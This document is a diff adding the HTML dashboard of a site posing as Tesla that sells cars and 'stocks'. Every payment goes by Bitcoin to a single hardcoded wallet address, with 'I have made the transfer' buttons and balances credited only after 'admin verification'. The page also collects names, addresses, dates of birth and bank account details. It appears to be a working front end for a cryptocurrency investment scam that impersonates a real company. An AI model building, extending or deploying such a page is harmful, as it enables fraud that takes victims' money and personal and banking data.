@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla • Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body class="dashboard-body">
+
+    <header class="top-bar">
+        <div class="menu-icon" id="dashMenuBtn"><i class="fas fa-bars"></i></div>
+        <div class="logo">T E S L A</div>
+        <div class="user-icon">
+            <i class="fas fa-bell"></i>
+            <span class="avatar" id="userAvatar">JD</span>
+        </div>
+    </header>
+
+    <div class="side-menu" id="dashMenu">
+        <div class="side-menu-header">
+            <div class="logo">T E S L A</div>
+            <span class="close-menu" id="closeDashMenu">&times;</span>
+        </div>
+        <div class="side-menu-links">
+            <a href="#" data-target="home"><i class="fas fa-home"></i> HOME</a>
+            <a href="#" data-target="shop"><i class="fas fa-car"></i> SHOP</a>
+            <a href="#" data-target="deposit"><i class="fas fa-arrow-down"></i> DEPOSIT</a>
+            <a href="#" data-target="withdraw"><i class="fas fa-arrow-up"></i> WITHDRAW</a>
+            <a href="#" data-target="plans"><i class="fas fa-chart-line"></i> STOCKS</a>
+            <a href="#" data-target="profile"><i class="fas fa-user"></i> PROFILE</a>
+            <a href="#" data-target="about"><i class="fas fa-info-circle"></i> ABOUT</a>
+        </div>
+    </div>
+    <div class="menu-overlay" id="dashMenuOverlay"></div>
+
+    <div class="ticker-wrap">
+        <div class="ticker">
+            <span class="tick-item">
+                <span class="red-dot"></span> LIVE MARKETS
+                <span class="price-tag">TSLA <span class="tick-price" id="tickTsla">$245.50</span> <span class="tick-pct green" id="tickTslaPct">+0.80%</span></span>
+                <span class="price-tag">RIVN <span class="tick-price" id="tickRivn">$15.80</span> <span class="tick-pct green" id="tickRivnPct">+1.20%</span></span>
+                <span class="price-tag">LCID <span class="tick-price" id="tickLcid">$3.45</span> <span class="tick-pct red" id="tickLcidPct">-0.30%</span></span>
+                <span class="price-tag">NIO <span class="tick-price" id="tickNio">$5.20</span> <span class="tick-pct green" id="tickNioPct">+0.50%</span></span>
+                <span class="price-tag">XPEV <span class="tick-price" id="tickXpev">$8.10</span> <span class="tick-pct green" id="tickXpevPct">+1.10%</span></span>
+                <span class="price-tag">LI <span class="tick-price" id="tickLi">$25.40</span> <span class="tick-pct red" id="tickLiPct">-0.20%</span></span>
+                <span class="price-tag">F <span class="tick-price" id="tickF">$12.30</span> <span class="tick-pct green" id="tickFPct">+0.40%</span></span>
+            </span>
+        </div>
+    </div>
+
+    <main class="dashboard-container">
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="home">INVESTMENT</button>
+            <button class="tab-btn" data-tab="shop">SHOPPING</button>
+        </div>
+
+        <div id="tab-home" class="tab-content active">
+            <h2 class="section-title">ACCOUNT OVERVIEW</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <p class="stat-label">TOTAL BALANCE</p>
+                    <h3 class="stat-value" id="userBalance">$0.00</h3>
+                    <i class="fas fa-wallet stat-icon"></i>
+                </div>
+                <div class="stat-card">
+                    <p class="stat-label">TOTAL STOCKS</p>
+                    <h3 class="stat-value" id="userStocks">$0.00</h3>
+                    <i class="fas fa-chart-pie stat-icon"></i>
+                </div>
+                <div class="stat-card">
+                    <p class="stat-label">TOTAL INVESTED</p>
+                    <h3 class="stat-value" id="userInvested">$0.00</h3>
+                    <i class="fas fa-lock stat-icon"></i>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-shop" class="tab-content">
+            <h2 class="section-title">AVAILABLE VEHICLES</h2>
+            <div class="car-grid" id="carGrid"></div>
+        </div>
+
+        <div id="tab-deposit" class="tab-content">
+            <h2 class="section-title">DEPOSIT FUNDS</h2>
+            <div class="deposit-info-panel">
+                <div class="info-row"><span><i class="fas fa-shield-alt"></i> Network</span><span class="info-val">Bitcoin (BTC)</span></div>
+                <div class="info-row"><span><i class="fas fa-clock"></i> Confirmation</span><span class="info-val">~30 minutes</span></div>
+                <div class="info-row"><span><i class="fas fa-coins"></i> Processing Fee</span><span class="info-val">$0.00</span></div>
+                <div class="info-row"><span><i class="fas fa-bolt"></i> Minimum Deposit</span><span class="info-val">$100.00</span></div>
+            </div>
+
+            <div class="action-card" id="step1Card">
+                <p class="deposit-label">STEP 1 — SELECT AMOUNT</p>
+                <p class="small-note">Choose how much you would like to deposit to your Tesla account.</p>
+                <div class="amount-grid" id="amountGrid">
+                    <button class="amount-btn" data-amount="500">$500</button>
+                    <button class="amount-btn" data-amount="1000">$1,000</button>
+                    <button class="amount-btn" data-amount="2500">$2,500</button>
+                    <button class="amount-btn" data-amount="5000">$5,000</button>
+                    <button class="amount-btn" data-amount="10000">$10,000</button>
+                    <button class="amount-btn" data-amount="25000">$25,000</button>
+                </div>
+                <p class="deposit-label" style="margin-top:20px;">OR ENTER CUSTOM AMOUNT</p>
+                <div class="custom-amount-box">
+                    <span class="currency-prefix">$</span>
+                    <input type="number" id="customAmount" placeholder="0.00" min="100">
+                </div>
+                <button class="btn-primary btn-block" id="btnContinueDeposit" style="margin-top:20px;">CONTINUE →</button>
+                <p class="small-note" style="text-align:center; margin-top:10px;">Minimum deposit: $100</p>
+            </div>
+
+            <div class="action-card" id="step2Card" style="display:none;">
+                <p class="deposit-label">STEP 2 — SEND BITCOIN</p>
+                <p class="small-note">You are depositing:</p>
+                <div class="deposit-amount-display" id="depositAmountDisplay">$0.00</div>
+                <div class="deposit-summary">
+                    <div class="summary-row"><span>Network</span><span>Bitcoin (BTC)</span></div>
+                    <div class="summary-row"><span>Est. Confirmation</span><span>~30 minutes</span></div>
+                    <div class="summary-row"><span>Fee</span><span class="free-fee">FREE</span></div>
+                </div>
+                <p class="small-note" style="margin-top:20px;">Send the exact amount to this Bitcoin (BTC) address:</p>
+                <div class="wallet-box">
+                    <code id="btcAddress">1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ</code>
+                    <button class="copy-btn" onclick="copyAddress()"><i class="fas fa-copy"></i></button>
+                </div>
+                <div class="deposit-warning">
+                    <i class="fas fa-info-circle"></i>
+                    <span>Send the exact amount. Your deposit will be credited after admin verification (usually within 30 minutes).</span>
+                </div>
+                <button class="btn-primary btn-block" id="btnNotifyDeposit" style="margin-top:15px;">I HAVE MADE THE TRANSFER</button>
+                <button class="btn-outline" style="margin-top:10px;" id="btnBackDeposit">← BACK</button>
+            </div>
+
+            <div class="action-card success-card" id="step3Card" style="display:none;">
+                <div class="success-icon"><i class="fas fa-check"></i></div>
+                <h3 class="success-title">Deposit Request Submitted</h3>
+                <p class="small-note" style="text-align:center;">Your deposit is now pending admin verification.</p>
+                <div class="success-details">
+                    <div class="detail-row"><span>Amount:</span> <span id="successAmount">$0.00</span></div>
+                    <div class="detail-row"><span>Method:</span> <span>Bitcoin (BTC)</span></div>
+                    <div class="detail-row"><span>Network Fee:</span> <span class="free-fee">FREE</span></div>
+                    <div class="detail-row"><span>Status:</span> <span class="status-pending">Pending Verification</span></div>
+                </div>
+                <button class="btn-outline" id="btnNewDeposit">MAKE ANOTHER DEPOSIT</button>
+            </div>
+        </div>
+
+        <!-- ============ WITHDRAW TAB ============ -->
+        <div id="tab-withdraw" class="tab-content">
+            <h2 class="section-title">WITHDRAW FUNDS</h2>
+
+            <div class="deposit-info-panel">
+                <div class="info-row"><span><i class="fas fa-wallet"></i> Available Balance</span><span class="info-val" id="withdrawAvailableBalance">$0.00</span></div>
+                <div class="info-row"><span><i class="fas fa-clock"></i> Processing Time</span><span class="info-val">~24 hours</span></div>
+                <div class="info-row"><span><i class="fas fa-coins"></i> Withdrawal Fee</span><span class="info-val">$0.00</span></div>
+                <div class="info-row"><span><i class="fas fa-bolt"></i> Minimum Withdrawal</span><span class="info-val">$50.00</span></div>
+            </div>
+
+            <!-- STEP 1 -->
+            <div class="action-card" id="wStep1">
+                <p class="deposit-label">STEP 1 — AMOUNT & METHOD</p>
+                <p class="small-note">Enter the amount you want to withdraw and choose your payment method.</p>
+
+                <div class="custom-amount-box" style="margin-top:15px;">
+                    <span class="currency-prefix">$</span>
+                    <input type="number" id="withdrawAmount" placeholder="0.00" min="50">
+                </div>
+
+                <div class="amount-grid" style="margin-top:12px;">
+                    <button class="amount-btn" data-wpercent="25">25%</button>
+                    <button class="amount-btn" data-wpercent="50">50%</button>
+                    <button class="amount-btn" data-wpercent="75">75%</button>
+                    <button class="amount-btn" data-wpercent="100">MAX</button>
+                </div>
+
+                <p class="deposit-label" style="margin-top:20px;">WITHDRAWAL METHOD</p>
+                <div class="amount-grid">
+                    <button class="amount-btn" id="wMethodCrypto" style="grid-column: span 3;">
+                        <i class="fab fa-bitcoin"></i> Bitcoin (BTC)
+                    </button>
+                    <button class="amount-btn" id="wMethodBank" style="grid-column: span 3;">
+                        <i class="fas fa-university"></i> Bank Transfer
+                    </button>
+                </div>
+
+                <button class="btn-primary btn-block" id="wBtnContinue" style="margin-top:20px;">CONTINUE →</button>
+            </div>
+
+            <!-- STEP 2 -->
+            <div class="action-card" id="wStep2" style="display:none;">
+                <p class="deposit-label">STEP 2 — PAYMENT DETAILS</p>
+                <p class="small-note" id="wStep2Label">Enter your Bitcoin wallet address.</p>
+
+                <div id="wCryptoFields">
+                    <div class="input-group" style="margin-top:15px;">
+                        <input type="text" id="wCryptoAddress" placeholder="Bitcoin Wallet Address">
+                    </div>
+                </div>
+
+                <div id="wBankFields" style="display:none;">
+                    <div class="input-group" style="margin-top:15px;">
+                        <input type="text" id="wBankName" placeholder="Bank Name">
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="wAccountName" placeholder="Account Holder Name">
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="wAccountNumber" placeholder="Account Number">
+                    </div>
+                </div>
+
+                <button class="btn-primary btn-block" id="wBtnReview" style="margin-top:15px;">REVIEW WITHDRAWAL →</button>
+                <button class="btn-outline" style="margin-top:10px;" id="wBtnBack1">← BACK</button>
+            </div>
+
+            <!-- STEP 3 -->
+            <div class="action-card" id="wStep3" style="display:none;">
+                <p class="deposit-label">STEP 3 — CONFIRM WITHDRAWAL</p>
+                <p class="small-note">Please review your withdrawal request before submitting.</p>
+
+                <div class="deposit-summary">
+                    <div class="summary-row"><span>Amount</span><span id="wReviewAmount">$0.00</span></div>
+                    <div class="summary-row"><span>Method</span><span id="wReviewMethod">-</span></div>
+                    <div class="summary-row"><span>Fee</span><span class="free-fee">FREE</span></div>
+                    <div class="summary-row"><span>You Receive</span><span id="wReviewReceive">$0.00</span></div>
+                </div>
+
+                <div id="wReviewDetails" style="margin-top:15px;"></div>
+
+                <button class="btn-primary btn-block" id="wBtnConfirm" style="margin-top:15px; background:#8B0000; color:#fff;">
+                    CONFIRM WITHDRAWAL
+                </button>
+                <button class="btn-outline" style="margin-top:10px;" id="wBtnBack2">← BACK</button>
+            </div>
+
+            <!-- STEP 4 -->
+            <div class="action-card success-card" id="wStep4" style="display:none;">
+                <div class="success-icon"><i class="fas fa-check"></i></div>
+                <h3 class="success-title">Withdrawal Submitted</h3>
+                <p class="small-note" style="text-align:center;">
+                    Your withdrawal request has been sent to the admin for review.
+                    You will receive your funds within ~24 hours after approval.
+                </p>
+                <div class="success-details">
+                    <div class="detail-row"><span>Amount:</span> <span id="wSuccessAmount">$0.00</span></div>
+                    <div class="detail-row"><span>Method:</span> <span id="wSuccessMethod">-</span></div>
+                    <div class="detail-row"><span>Status:</span> <span class="status-pending">Pending Review</span></div>
+                </div>
+                <button class="btn-outline" id="wBtnNew">MAKE ANOTHER WITHDRAWAL</button>
+            </div>
+        </div>
+
+        <div id="tab-plans" class="tab-content">
+            <h2 class="section-title">AVAILABLE STOCKS</h2>
+            <div class="plans-list" id="plansList"></div>
+        </div>
+
+        <div id="tab-profile" class="tab-content">
+            <h2 class="section-title">MY PROFILE</h2>
+            <div class="profile-hero">
+                <div class="profile-avatar-large" id="profileAvatarLarge">JD</div>
+                <div class="profile-hero-info">
+                    <h3 id="heroName">-</h3>
+                    <p id="heroEmail">-</p>
+                    <span class="verified-badge" id="heroStatus"><i class="fas fa-check-circle"></i> VERIFIED</span>
+                </div>
+            </div>
+            <h2 class="section-title" style="margin-top:25px;">ACCOUNT STATISTICS</h2>
+            <div class="profile-stats">
+                <div class="p-stat"><i class="fas fa-wallet"></i><p class="p-stat-label">BALANCE</p><p class="p-stat-val" id="profBalance">$0</p></div>
+                <div class="p-stat"><i class="fas fa-chart-pie"></i><p class="p-stat-label">STOCKS</p><p class="p-stat-val" id="profStocks">$0</p></div>
+                <div class="p-stat"><i class="fas fa-lock"></i><p class="p-stat-label">INVESTED</p><p class="p-stat-val" id="profInvested">$0</p></div>
+            </div>
+            <h2 class="section-title" style="margin-top:25px;">PERSONAL INFORMATION</h2>
+            <div class="profile-card">
+                <div class="profile-row"><span><i class="fas fa-user"></i> Full Name</span><span id="profName">-</span></div>
+                <div class="profile-row"><span><i class="fas fa-envelope"></i> Email Address</span><span id="profEmail">-</span></div>
+                <div class="profile-row"><span><i class="fas fa-map-marker-alt"></i> State</span><span id="profState">-</span></div>
+                <div class="profile-row"><span><i class="fas fa-mail-bulk"></i> Postal Code</span><span id="profPostal">-</span></div>
+                <div class="profile-row"><span><i class="fas fa-birthday-cake"></i> Date of Birth</span><span id="profDob">-</span></div>
+                <div class="profile-row"><span><i class="fas fa-user-shield"></i> Account Status</span><span id="profStatus" class="badge">-</span></div>
+                <div class="profile-row"><span><i class="fas fa-calendar-alt"></i> Member Since</span><span id="profSince">-</span></div>
+            </div>
+            <h2 class="section-title" style="margin-top:25px;">PENDING CAR DELIVERY</h2>
+            <div id="pendingCarsList" class="plans-list"><p class="small-note">No pending car deliveries.</p></div>
+            <button class="btn-outline" style="margin-top:20px;" id="btnLogout">LOG OUT</button>
+        </div>
+
+        <div id="tab-about" class="tab-content">
+            <h2 class="section-title">ABOUT TESLA</h2>
+            <div class="about-card">
+                <h3>Tesla, Inc.</h3>
+                <p>Tesla's mission is to accelerate the world's transition to sustainable energy. Founded in 2003, Tesla has become the world's leading electric vehicle manufacturer, producing the safest, fastest, and most efficient cars on the road.</p>
+                <p>Beyond vehicles, Tesla designs and manufactures energy storage systems, solar panels, and clean energy solutions that power homes, businesses, and utilities worldwide.</p>
+                <div class="about-quote">"The present is theirs; the future, for which I really worked, is mine." — Nikola Tesla</div>
+            </div>
+        </div>
+    </main>
+
+    <nav class="bottom-nav">
+        <button class="nav-item active" data-target="home"><i class="fas fa-home"></i><span>HOME</span></button>
+        <button class="nav-item" data-target="shop"><i class="fas fa-car"></i><span>SHOP</span></button>
+        <button class="nav-item" data-target="deposit"><i class="fas fa-arrow-down"></i><span>DEPOSIT</span></button>
+        <button class="nav-item" data-target="withdraw"><i class="fas fa-arrow-up"></i><span>WITHDRAW</span></button>
+        <button class="nav-item" data-target="plans"><i class="fas fa-chart-line"></i><span>STOCKS</span></button>
+        <button class="nav-item" data-target="profile"><i class="fas fa-user"></i><span>PROFILE</span></button>
+    </nav>
+
+    <div class="modal-overlay" id="purchaseModal">
+        <div class="modal-content">
+            <span class="close-btn" id="closePurchase">&times;</span>
+            <h3>Complete Your Purchase</h3>
+            <p id="purchaseCarName" style="color:#888; margin-bottom:15px;"></p>
+            <form id="purchaseForm">
+                <div class="input-group"><input type="text" id="buyName" placeholder="Full Name" required></div>
+                <div class="input-group"><input type="text" id="buyPhone" placeholder="Phone Number" required></div>
+                <div class="input-group"><input type="text" id="buyAddress" placeholder="Delivery Address" required></div>
+                <div class="input-group"><input type="text" id="buyCity" placeholder="City" required></div>
+                <div class="input-group"><input type="text" id="buyPostal" placeholder="Postal Code" required></div>
+                <button type="submit" class="btn-primary btn-block">CONFIRM ORDER</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="planPaymentModal">
+        <div class="modal-content plan-payment-modal">
+            <span class="close-btn" id="closePlanPayment">&times;</span>
+            <div class="plan-pay-badge" id="planPayBadge">TSLA</div>
+            <h3 class="plan-pay-title" id="planPayName">Tesla, Inc.</h3>
+            <p class="small-note" style="text-align:center;">Price per share: <span id="planPayPriceDisplay">$0.00</span></p>
+            <div class="input-group" style="margin-top:15px; margin-bottom:15px;">
+                <input type="number" id="shareQuantity" placeholder="Number of shares" min="1" value="1" style="text-align:center; font-weight:700; font-size:1.1rem;">
+            </div>
+            <p class="small-note" style="text-align:center;">Total Cost:</p>
+            <div class="plan-pay-amount" id="planPayAmount">$0.00</div>
+            <p class="small-note" style="margin-top:20px;">Send the exact amount in Bitcoin (BTC) to this address:</p>
+            <div class="wallet-box">
+                <code id="planBtcAddress">1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ</code>
+                <button class="copy-btn" onclick="copyPlanAddress()"><i class="fas fa-copy"></i></button>
+            </div>
+            <div class="deposit-warning">
+                <i class="fas fa-info-circle"></i>
+                <span>After sending, click below to notify the admin. Your stock purchase will be executed once payment is confirmed.</span>
+            </div>
+            <button class="btn-primary btn-block" id="btnConfirmPlanPayment" style="margin-top:15px; background:#8B0000; color:#fff;">I HAVE MADE THE TRANSFER</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="universalModal">
+        <div class="modal-content universal-modal" id="universalModalContent">
+            <div class="universal-icon" id="universalIcon"><i class="fas fa-info-circle"></i></div>
+            <h3 class="universal-title" id="universalTitle">Title</h3>
+            <p class="universal-text" id="universalText">Message</p>
+            <div class="universal-actions" id="universalActions"></div>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore-compat.js"></script>
+
+    <script src="script.js"></script>
+    <script>document.addEventListener('DOMContentLoaded', () => { if (typeof initDashboard === 'function') initDashboard(); });</script>
+    
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/6ab1ec50e43bda343f3cf336/default';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+</body>
+</html>
